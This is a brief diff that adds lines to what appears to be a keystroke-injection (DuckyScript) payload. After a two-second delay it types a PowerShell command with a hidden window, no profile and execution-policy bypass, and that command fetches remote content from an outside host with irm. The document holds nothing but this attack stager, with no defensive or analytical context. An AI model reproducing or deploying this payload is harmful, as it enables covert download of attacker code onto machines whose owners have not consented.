@@ -1,1 +1,3 @@
+DELAY 2000
 
+STRING powershell -w h -NoP -NonI -Exec Bypass irm jakoby.lol/0t
